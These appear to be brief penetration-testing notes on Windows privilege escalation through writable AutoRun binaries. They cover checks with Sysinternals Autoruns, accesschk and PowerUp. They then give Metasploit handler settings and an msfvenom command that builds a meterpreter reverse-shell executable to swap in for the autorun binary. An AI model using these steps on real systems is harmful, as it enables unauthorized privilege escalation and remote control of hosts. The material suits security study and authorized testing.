# Windows AutoRun

https://docs.microsoft.com/en-us/sysinternals/



- - Autoruns
  - sysinternal tool
  - will show what is running at logon 

- accesscheck.exe
  - sysinternal tool
  - shows what access users or groups have to resources

```
accesschk64.exe -wvu "C:\Path\to\program"
```



- If a file automatically runs, that you have write access to, you can replace the binary for priv esc



- Powerup will also find autoruns that can be modified 
  - using Invoke-all-checks

- Also look for binaries that are missing. 

## Exploitation

- Metasploit

```
use multi/handler
set payload windows.meterpreter/reverse_tcp
set LHOST

msfvenom -p windows/meterpreter/reverse_tcp lhost= -f exe -o program.exe
```

- Copy the payload to the host
- Replace the affected binary 
- Logon/Logoff/Restart the host or just wait